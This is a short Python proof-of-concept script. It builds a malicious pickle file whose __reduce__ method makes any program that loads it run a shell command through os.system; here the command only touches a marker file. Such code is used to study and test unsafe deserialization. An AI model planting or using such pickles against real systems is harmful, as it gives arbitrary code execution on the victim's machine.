import os
import pickle
class EvilTsukimi:
    def __reduce__(self):
        return os.system, ('touch evidence_of_evil',)
evil = EvilTsukimi()
pickle.dump(evil, open("tsukimi.pickle", "wb"))